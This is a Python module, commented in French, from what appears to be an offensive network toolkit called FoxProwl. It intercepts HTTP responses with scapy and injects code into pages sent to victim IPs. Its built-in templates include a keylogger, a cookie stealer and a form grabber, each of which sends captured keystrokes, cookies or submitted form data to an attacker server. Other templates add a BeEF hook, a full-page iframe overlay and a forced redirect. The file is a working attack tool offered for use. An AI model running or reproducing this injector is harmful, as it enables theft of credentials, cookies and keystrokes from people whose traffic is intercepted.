"""
modules/http_injector.py
HTTP Injector professionnel.
- Injection de code JS/HTML dans les réponses HTTP
- Support BeEF hook, keyloggers, trackers
- Injection intelligente (head, body, avant </html>)
- Ajustement Content-Length automatique
- Multiple points d'injection
"""
import re
import time
import threading
from typing import Optional, Set
from pathlib import Path

from scapy.all import sniff, sendp, Ether, IP, TCP, Raw

from core.logger import log
from core.config import conf, attack_conf
from core.utils import Counter


class HTTPInjector:
    """
    HTTP Injector pour injection de contenu dans le trafic HTTP.
    
    Fonctionnalités:
    - Injection de scripts JS
    - Injection de hooks BeEF
    - Injection de keyloggers
    - Support de templates personnalisés
    - Ajustement automatique des headers HTTP
    """
    
    # Templates prédéfinis
    TEMPLATES = {
        "alert": '<script>alert("FoxProwl - You have been hacked!");</script>',
        
        "beef": '<script src="http://{server}:{port}/hook.js"></script>',
        
        "keylogger": '''<script>
(function(){
    var k="",t="{server}";
    document.onkeypress=function(e){
        k+=String.fromCharCode(e.keyCode||e.which);
        if(k.length>20){
            new Image().src="http://"+t+"/log?k="+encodeURIComponent(k);
            k="";
        }
    };
})();
</script>''',
        
        "cookie_stealer": '''<script>
new Image().src="http://{server}/steal?c="+encodeURIComponent(document.cookie)+"&u="+encodeURIComponent(location.href);
</script>''',
        
        "form_grabber": '''<script>
document.querySelectorAll("form").forEach(function(f){
    f.addEventListener("submit",function(){
        var d={};
        new FormData(f).forEach(function(v,k){d[k]=v;});
        navigator.sendBeacon("http://{server}/grab",JSON.stringify(d));
    });
});
</script>''',
        
        "redirect": '<meta http-equiv="refresh" content="0;url={url}">',
        
        "iframe": '<iframe src="{url}" style="position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:999999;"></iframe>'
    }
    
    def __init__(
        self,
        target_ip: str = None,
        target_ips: Set[str] = None,
        inject_code: str = None,
        template: str = None,
        server: str = None,
        port: int = 3000,
        http_ports: Set[int] = None
    ):
        """
        :param target_ip: IP unique de la victime
        :param target_ips: Set d'IPs cibles (alternative)
        :param inject_code: Code à injecter (override template)
        :param template: Nom du template (alert, beef, keylogger, etc.)
        :param server: Serveur attaquant pour les callbacks
        :param port: Port du serveur (pour BeEF)
        :param http_ports: Ports HTTP à surveiller
        """
        self.target_ips = target_ips or ({target_ip} if target_ip else set())
        self.server = server or conf.attacker_ip
        self.port = port
        self.http_ports = http_ports or {80, 8080}
        
        # Construire le code d'injection
        if inject_code:
            self.inject_code = inject_code
        elif template and template in self.TEMPLATES:
            self.inject_code = self.TEMPLATES[template].format(
                server=self.server,
                port=self.port,
                url=f"http://{self.server}:{self.port}/"
            )
        else:
            self.inject_code = self.TEMPLATES["alert"]
        
        # Stats
        self.injections_count = Counter()
        self.packets_processed = Counter()
        
        # État
        self.running = False
        self._thread: Optional[threading.Thread] = None
        self.start_time: float = 0.0
    
    def _find_injection_point(self, html: bytes) -> tuple:
        """
        Trouve le meilleur point d'injection dans le HTML.
        Retourne (position, html_modifié) ou (None, None).
        """
        html_lower = html.lower()
        inject_bytes = self.inject_code.encode()
        
        # Priorité des points d'injection
        injection_points = [
            (b"<head>", b"<head>", True),      # Après <head>
            (b"<head ", b">", True),           # Après <head ...>
            (b"<body>", b"<body>", True),      # Après <body>
            (b"<body ", b">", True),           # Après <body ...>
            (b"</body>", b"</body>", False),   # Avant </body>
            (b"</html>", b"</html>", False),   # Avant </html>
        ]
        
        for start_tag, end_marker, inject_after in injection_points:
            pos = html_lower.find(start_tag)
            if pos == -1:
                continue
            
            if end_marker != start_tag:
                # Trouver la fin du tag
                end_pos = html_lower.find(end_marker, pos)
                if end_pos == -1:
                    continue
                inject_pos = end_pos + len(end_marker)
            else:
                inject_pos = pos + len(start_tag)
            
            if inject_after:
                # Injecter après le tag
                modified = html[:inject_pos] + inject_bytes + html[inject_pos:]
            else:
                # Injecter avant le tag
                modified = html[:pos] + inject_bytes + html[pos:]
            
            return inject_pos, modified
        
        # Fallback: ajouter à la fin
        return len(html), html + inject_bytes
    
    def _update_content_length(self, response: bytes, size_delta: int) -> bytes:
        """Met à jour le Content-Length dans les headers HTTP."""
        # Chercher Content-Length
        cl_match = re.search(rb"Content-Length:\s*(\d+)", response, re.IGNORECASE)
        if not cl_match:
            return response
        
        old_length = int(cl_match.group(1))
        new_length = old_length + size_delta
        
        # Remplacer
        old_header = cl_match.group(0)
        new_header = f"Content-Length: {new_length}".encode()
        
        return response.replace(old_header, new_header, 1)
    
    def _process_packet(self, pkt):
        """Traite un paquet HTTP."""
        if not pkt.haslayer(TCP) or not pkt.haslayer(Raw):
            return
        
        try:
            # Vérifier que c'est une réponse du serveur vers une cible
            if pkt[TCP].sport not in self.http_ports:
                return
            
            dst_ip = pkt[IP].dst
            if self.target_ips and dst_ip not in self.target_ips:
                return
            
            self.packets_processed.increment()
            
            payload = pkt[Raw].load
            
            # Vérifier que c'est une réponse HTML
            if not payload.startswith(b"HTTP/"):
                return
            
            # Vérifier Content-Type HTML
            if b"text/html" not in payload[:1000]:
                return
            
            # Séparer headers et body
            header_end = payload.find(b"\r\n\r\n")
            if header_end == -1:
                return
            
            headers = payload[:header_end + 4]
            body = payload[header_end + 4:]
            
            # Vérifier que le body n'est pas déjà injecté
            if self.inject_code.encode()[:50] in body:
                return
            
            # Trouver le point d'injection
            inject_pos, modified_body = self._find_injection_point(body)
            if modified_body is None:
                return
            
            size_delta = len(modified_body) - len(body)
            
            # Mettre à jour Content-Length
            modified_headers = self._update_content_length(headers, size_delta)
            
            # Construire le nouveau payload
            new_payload = modified_headers + modified_body
            
            # Construire et envoyer le paquet
            if pkt.haslayer(Ether):
                new_pkt = Ether(src=pkt[Ether].src, dst=pkt[Ether].dst) / \
                          IP(src=pkt[IP].src, dst=pkt[IP].dst, ttl=pkt[IP].ttl) / \
                          TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport,
                              flags=pkt[TCP].flags, seq=pkt[TCP].seq, ack=pkt[TCP].ack,
                              window=pkt[TCP].window) / \
                          Raw(load=new_payload)
            else:
                new_pkt = IP(src=pkt[IP].src, dst=pkt[IP].dst, ttl=pkt[IP].ttl) / \
                          TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport,
                              flags=pkt[TCP].flags, seq=pkt[TCP].seq, ack=pkt[TCP].ack,
                              window=pkt[TCP].window) / \
                          Raw(load=new_payload)
            
            sendp(new_pkt, iface=conf.interface, verbose=False)
            
            self.injections_count.increment()
            log.attack(f"Code injecté vers {dst_ip} ({size_delta:+d} bytes)")
            
        except Exception as e:
            pass
    
    def _main_loop(self):
        """Boucle principale."""
        # Construire le filtre BPF
        port_filter = " or ".join(f"src port {p}" for p in self.http_ports)
        
        if self.target_ips:
            ip_filter = " or ".join(f"dst host {ip}" for ip in self.target_ips)
            bpf = f"tcp and ({port_filter}) and ({ip_filter})"
        else:
            bpf = f"tcp and ({port_filter})"
        
        log.info(f"Filtre BPF: {bpf}")
        
        try:
            sniff(
                iface=conf.interface,
                filter=bpf,
                prn=self._process_packet,
                stop_filter=lambda x: not self.running,
                store=0
            )
        except Exception as e:
            if self.running:
                log.error(f"Erreur sniff HTTP injector: {e}")
    
    def start(self):
        """Démarre l'injection."""
        if self.running:
            return
        
        self.running = True
        self.start_time = time.time()
        
        log.attack("HTTP Injector démarré")
        log.info(f"  Cibles: {self.target_ips or 'Toutes'}")
        log.info(f"  Injection: {self.inject_code[:50]}...")
        
        self._thread = threading.Thread(target=self._main_loop, daemon=True)
        self._thread.start()
    
    def stop(self):
        """Arrête l'injection."""
        if not self.running:
            return
        
        self.running = False
        
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=3.0)
        
        duration = time.time() - self.start_time
        log.success(
            f"HTTP Injector arrêté. "
            f"Durée: {duration:.1f}s, "
            f"Injections: {self.injections_count.value}"
        )
    
    def get_stats(self) -> dict:
        """Retourne les statistiques."""
        return {
            "running": self.running,
            "targets": list(self.target_ips),
            "packets_processed": self.packets_processed.value,
            "injections": self.injections_count.value,
            "duration": time.time() - self.start_time if self.start_time else 0
        }
    
    @classmethod
    def available_templates(cls) -> list:
        """Retourne la liste des templates disponibles."""
        return list(cls.TEMPLATES.keys())
    
    def __enter__(self):
        self.start()
        return self
    
    def __exit__(self, *args):
        self.stop()
        return False